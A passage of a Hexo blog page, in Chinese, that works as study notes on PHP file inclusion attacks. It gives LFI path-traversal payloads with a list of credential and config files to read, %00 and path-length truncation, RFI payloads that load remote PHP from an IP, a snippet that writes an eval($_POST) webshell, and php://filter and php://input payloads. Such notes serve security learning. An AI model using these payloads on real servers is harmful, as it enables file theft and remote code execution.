@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="文件包含文件包含概述和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。 在PHP中,可以在服务器执行PHP文件之前在该文件中插入一个文件的内容 如果一个文件中对应的功能已经写好了,那么想要在其他PHP文件中使用，必须要保证该文件中的代码都进入到内存，而且彼此间有关联才可。PHP提供了一-种解决方案，就是文件包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2022/04/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文件包含文件包含概述和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。 在PHP中,可以在服务器执行PHP文件之前在该文件中插入一个文件的内容 如果一个文件中对应的功能已经写好了,那么想要在其他PHP文件中使用，必须要保证该文件中的代码都进入到内存，而且彼此间有关联才可。PHP提供了一-种解决方案，就是文件包含">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-21T04:09:37.309Z">
+<meta property="article:modified_time" content="2022-04-21T07:52:00.081Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-文件包含" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/04/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+  <time datetime="2022-04-21T04:09:37.309Z" itemprop="datePublished">2022-04-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h2><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。</p>
+<p>在PHP中,可以在服务器执行PHP文件之前在该文件中插入一个文件的内容</p>
+<p>如果一个文件中对应的功能已经写好了,那么想要在其他PHP文件中使用，必须要保证该文件中的代码都进入到内存，而且彼此间有关联才可。PHP提供了一-种解决方案，就是文件包含</p>
+<span id="more"></span>
+
+<p>以PHP为例，常用的文件包含函数有以下四种：</p>
+<p>include()，require()，include_once()，require_once()</p>
+<p>区别如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。</span><br><span class="line">include()，找不到被包含的文件时只会产生警告，脚本将继续运行。</span><br><span class="line">include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">带once指的是包含一次</span><br></pre></td></tr></table></figure>
+
+<p>其他用于包含的函数: highlight_file()、 show_source()、readfile()、 file_get_contents()、fopen()、 file()</p>
+<h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。<br>（1）使用绝对路径<br>使用绝对路径直接进行读取：<br>2）使用相对路径进行读取：<br>当前页面所在路径为C:\Apache24\htdocs\，我们需要使用…/退到C盘再进行访问，构造路径如下：<br>…/…/windows/system.ini<br>（3）一些常见的敏感信息路径：<br>Windows系统：<br>    c:\boot.ini // 查看系统版本<br>    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br>    c:\windows\repair\sam // 存储Windows系统初次安装的密码<br>    c:\ProgramFiles\mysql\my.ini // MySQL配置<br>    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br>    c:\windows\php.ini // php 配置信息<br>Linux/Unix系统：<br>    /etc/passwd // 账户信息<br>    /etc/shadow // 账户密码文件<br>    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br>    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br>    /usr/local/app/php5/lib/php.ini // PHP相关配置<br>    /etc/httpd/conf/httpd.conf // Apache配置文件<br>    /etc/my.conf // mysql 配置文件</p>
+<h3 id="有限制本地文件包含漏洞绕过"><a href="#有限制本地文件包含漏洞绕过" class="headerlink" title="有限制本地文件包含漏洞绕过"></a>有限制本地文件包含漏洞绕过</h3><h4 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h4><p>·条件:1、Windows下要长于256字节，超出的部分会被丢弃<br>           2、Linux下要长于4096字节，超出的部分会被丢弃。<br>192.168.152.143/action2.php?action=phpifo.php/./././././././././././././././././././././././././././././</p>
+<h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p>如果我们想通过文件包含漏洞读取本地敏感信息，就会遇到一些问题。因为服务器会给路径加上./site/路径，以及.php后缀。<br>此时我们可以使用使用%00截断：<br>%00为结束符，在filename后带上%00，就可以截断末尾的.php。<br>当前路径为./site/，如果要读取system.ini，则需要输入：…/…/…/windows/system.ini%00，<br>需要注意的是，%00截断需要php版本小于5.3.4，且关闭magic_quotes_gpc功能</p>
+<h4 id="配合文件上传使用"><a href="#配合文件上传使用" class="headerlink" title="配合文件上传使用"></a>配合文件上传使用</h4><p>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。<br>编辑一个图片马，找到上传点进行上传，文件保存的完整路径为：<br>C:\phpStudy\WWW\hackable\uploads\webshell.jpg<br>找到具有文件包含漏洞的页面  该页面用于读取C:\phpStudy\WWW\vulnerabilities\fi\路径中的文件  现在我们利用该页面去执行我们上传的图片马，路径需要从C:\phpStudy\WWW\vulnerabilities\fi\  转到C:\phpStudy\WWW\hackable\uploads\webshell.jpg<br>192.168.211.151/vulnerabilities/fi/?page=../../hackable/uploads/webshell.jpg<br>使用webshell管理工具连接即可。</p>
+<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><h3 id="远程包含的意思"><a href="#远程包含的意思" class="headerlink" title="远程包含的意思"></a>远程包含的意思</h3><p>指的是能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp 等方式，远程加载文性。</p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。</p>
+<h3 id="包含条件"><a href="#包含条件" class="headerlink" title="包含条件"></a>包含条件</h3><p>allow_url_include=On（默认为OFF，需要在php.ini中手动打开)</p>
+<p>allow _url_fopen = On（是否允许打开远程文件)</p>
+<p>用户可以动态控制变量</p>
+<h3 id="举例"><a href="#举例" class="headerlink" title="举例:"></a>举例:</h3><p>[URL]?path=<a target="_blank" rel="noopener" href="http://ip/info.php//%E9%80%9A%E8%BF%87http%E5%8D%8F%E8%AE%AE%E5%8A%A0%E8%BD%BD%E7%9B%AE%E6%A0%87%E6%9C%BA%E4%B8%AD%E7%9A%84info.php%E6%96%87%E4%BB%B6">http://ip/info.php//通过http协议加载目标机中的info.php文件</a><br>[URL]?path=ftp://用户名:密码@ip/info.php //通过ftp协议加载目标机中的info.php文件<br>文件包含漏洞的利用</p>
+<h3 id="有限制远程文件包含漏洞绕过绕过方法"><a href="#有限制远程文件包含漏洞绕过绕过方法" class="headerlink" title="有限制远程文件包含漏洞绕过绕过方法"></a>有限制远程文件包含漏洞绕过绕过方法</h3><h4 id="1-问号绕过"><a href="#1-问号绕过" class="headerlink" title="1.问号绕过"></a>1.问号绕过</h4><ul>
+<li>payload : ?action=<a target="_blank" rel="noopener" href="http://192.168.152.143/phpinfo.php">http://192.168.152.143/phpinfo.php</a>?</li>
+</ul>
+<h4 id="2-号绕过"><a href="#2-号绕过" class="headerlink" title="2.#号绕过"></a>2.#号绕过</h4><ul>
+<li>payload : ?action=<a target="_blank" rel="noopener" href="http://192.168.152.143/phpinfo.php%23">http://192.168.152.143/phpinfo.php%23</a></li>
+</ul>
+<h4 id="3-空格绕过"><a href="#3-空格绕过" class="headerlink" title="3.空格绕过"></a>3.空格绕过</h4><p>   ●  payload : ?action=<a target="_blank" rel="noopener" href="http://192.168.152.143/phpinfo.php%20">http://192.168.152.143/phpinfo.php%20</a></p>
+<h2 id="文件包含漏洞的利用"><a href="#文件包含漏洞的利用" class="headerlink" title="文件包含漏洞的利用"></a>文件包含漏洞的利用</h2><h3 id="1-端口探测"><a href="#1-端口探测" class="headerlink" title="1.端口探测"></a>1.端口探测</h3><p>url=dict//ip:80</p>
+<h3 id="2-包含上传的webshell达到getshell"><a href="#2-包含上传的webshell达到getshell" class="headerlink" title="2.包含上传的webshell达到getshell"></a>2.包含上传的webshell达到getshell</h3><p>·上传图片马，利用文件包含我们的图片马，菜刀连接</p>
+<h3 id="3-包含日志文件GetShell"><a href="#3-包含日志文件GetShell" class="headerlink" title="3.包含日志文件GetShell"></a>3.包含日志文件GetShell</h3><p>·为了避免在web中进行了url编码，进行报错，把报错信息写进日志</p>
+<h3 id="4、远程文件包含写shell"><a href="#4、远程文件包含写shell" class="headerlink" title="4、远程文件包含写shell"></a>4、远程文件包含写shell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27; &lt;?php eval($_POST[1])?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在文件夹下会看到生成shell.php,内容为<?php eval($_POST['1']);?>，当直接包含图片时，代码就会被执行</p>
+<h3 id="5、使用PHP伪协议GetShell"><a href="#5、使用PHP伪协议GetShell" class="headerlink" title="5、使用PHP伪协议GetShell"></a>5、使用PHP伪协议GetShell</h3><h2 id="◆PHP伪协议的介绍"><a href="#◆PHP伪协议的介绍" class="headerlink" title="◆PHP伪协议的介绍"></a>◆PHP伪协议的介绍</h2><h3 id="什么是伪协议"><a href="#什么是伪协议" class="headerlink" title="什么是伪协议"></a>什么是伪协议</h3><p>PHP伪协议事实上就是支持的协议与封装协议</p>
+<h3 id="PHP伪协议的用途"><a href="#PHP伪协议的用途" class="headerlink" title="PHP伪协议的用途"></a>PHP伪协议的用途</h3><table>
+<thead>
+<tr>
+<th align="center">file://</th>
+<th align="center">访问本地文件系统</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">http://</td>
+<td align="center">访问HTTP(s)网址</td>
+</tr>
+<tr>
+<td align="center">ftp://</td>
+<td align="center">访问FTP(s) URLS</td>
+</tr>
+<tr>
+<td align="center">php://</td>
+<td align="center">访问各个输入/输出流</td>
+</tr>
+<tr>
+<td align="center">zlib://</td>
+<td align="center">压缩流</td>
+</tr>
+<tr>
+<td align="center">data://</td>
+<td align="center">数据(RFC2397)</td>
+</tr>
+<tr>
+<td align="center">rar://</td>
+<td align="center">RAR</td>
+</tr>
+</tbody></table>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>用途:常用于读取文件/源码</p>
+<p>使用条件:allow_url_fopen : off/on<br>                allow_url_include : off/on两个配置都为off的情况下是可以正常使用的<br>使用:[?path=php://filter/read=convert.base64-encode/resource=文件.php]</p>
+<p>注意∶通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell ,但能读取敏感文件。</p>
+<p>php://filter协议与file//协议的区别: file协议只能使用绝对路径，filter协议相对路径和绝对路径都可以使用</p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>●用途:可以访问请求的原始数据的只读流，将post请求中的数据作为PHP代码执行</p>
+<p>●使用条件: allow_url_fopen : off/on</p>
+<p>allow url_include : on</p>
+<p>●使用方法: ?file=php://input</p>
+<p>[POST] : <?php phpinfo()?> (执行POST DATA中的内容)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="cl28pebbp0001kku20ze5hv09" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/04/21/XSS%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/04/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/04/21/XSS%E6%BC%8F%E6%B4%9E/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/20/%E7%BB%95%E8%BF%87waf%E6%8A%80%E5%B7%A7/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/20/SQLMAP/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
